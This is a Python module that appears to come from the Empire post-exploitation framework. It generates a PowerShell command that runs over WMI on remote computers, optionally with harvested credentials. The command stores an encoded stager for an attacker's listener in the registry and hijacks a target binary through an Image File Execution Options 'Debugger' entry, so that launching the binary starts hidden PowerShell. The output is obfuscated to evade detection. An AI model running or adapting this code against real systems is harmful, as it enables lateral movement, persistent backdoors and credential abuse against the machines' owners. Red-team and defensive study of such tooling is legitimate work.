from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.database.models import Credential
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        
        script = """$null = Invoke-WmiMethod -Path Win32_process -Name create"""
        # Set booleans to false by default
        obfuscate = False

        # management options
        cleanup = params['Cleanup']
        binary = params['Binary']
        target_binary = params['TargetBinary']
        listener_name = params['Listener']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']

        # storage options
        reg_path = params['RegPath']

        status_msg = ""
        location_string = ""

        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":
            
            if not main_menu.credentials.is_credential_valid(cred_id):
                return handle_error_message("[!] CredID is invalid!")

            cred: Credential = main_menu.credentials.get_credentials(cred_id)

            if cred.domain != "":
                params["UserName"] = str(cred.domain) + "\\" + str(cred.username)
            else:
                params["UserName"] = str(cred.username)
            if cred.password != "":
                params["Password"] = cred.password


        if cleanup.lower() == 'true':
            # the registry command to disable the debugger for the target binary
            payload_code = "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"';"
            status_msg += " to remove the debugger for " + target_binary

        elif listener_name != '':
            # if there's a listener specified, generate a stager and store it
            if not main_menu.listeners.is_listener_valid(listener_name):
                # not a valid listener, return nothing for the script
                return handle_error_message("[!] Invalid listener: " + listener_name)

            else:
                # generate the PowerShell one-liner with all of the proper options set
                launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                               obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
                                                               bypasses=params['Bypasses'])
                
                encScript = launcher.split(" ")[-1]
                # statusMsg += "using listener " + listenerName

            path = "\\".join(reg_path.split("\\")[0:-1])
            name = reg_path.split("\\")[-1]

            # statusMsg += " stored in " + regPath + "."

            payload_code = "$RegPath = '"+reg_path+"';"
            payload_code += "$parts = $RegPath.split('\\');"
            payload_code += "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
            payload_code += "$name = $parts[-1];"
            payload_code += "$null=Set-ItemProperty -Force -Path $path -Name $name -Value "+encScript+";"

            # note where the script is stored
            location_string = "$((gp "+path+" "+name+")."+name+")"

            payload_code += "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"' -Name Debugger -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+location_string+";start -Win Hidden -A \\\"-enc $x\\\" powershell\";exit;';"

            status_msg += " to set the debugger for "+target_binary+" to be a stager for listener " + listener_name + "."

        else:
            payload_code = "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"' -Name Debugger -Value '"+binary+"';"
            
            status_msg += " to set the debugger for "+target_binary+" to be " + binary + "."

        # unicode-base64 the payload code to execute on the targets with -enc
        encPayload = helpers.enc_powershell(payload_code)

        # build the WMI execution string
        computer_names = "\"" + "\",\"".join(params['ComputerName'].split(",")) + "\""

        script += " -ComputerName @("+computer_names+")"
        script += " -ArgumentList \"C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -enc " + encPayload.decode('UTF-8') + "\""

        # if we're supplying alternate user credentials
        if params["UserName"] != '':
            script = "$PSPassword = \""+params["Password"]+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+params["UserName"]+"\",$PSPassword);" + script + " -Credential $Credential"

        script += ";'Invoke-Wmi executed on " +computer_names + status_msg+"'"

        script = data_util.keyword_obfuscation(script)
        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
        script = data_util.keyword_obfuscation(script)

        return script

